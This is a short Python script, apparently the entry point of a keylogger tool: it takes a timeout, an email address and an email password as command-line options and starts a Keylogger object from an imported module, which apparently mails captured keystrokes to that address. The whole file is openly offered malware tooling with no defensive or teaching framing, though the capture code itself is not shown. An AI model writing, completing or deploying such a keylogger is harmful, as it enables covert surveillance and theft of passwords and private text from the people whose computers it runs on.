# !/usr/bin/env python
import keyloggerclass
import optparse
import smtplib
def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--timeout", dest="timeout", help="Time after which send mail...")
    parser.add_option("-m", "--mail", dest="mail", help="Mail address...")
    parser.add_option("-p", "--pass", dest="password", help="Password...")
    (options, arguments) = parser.parse_args()
    if not options.mail:
        parser.error("[-] Please specify mail address ,use --help for info")
    elif not options.timeout:
        parser.error("[-] Please specify timeout ,use --help for info")
    elif not options.password:
        parser.error("[-] Please specify password ,use --help for info")
    return options

options = get_arguments()
timeout=options.timeout
mail = options.mail
password=options.password


keylogger = keyloggerclass.Keylogger(timeout,mail,password)
keylogger.start()
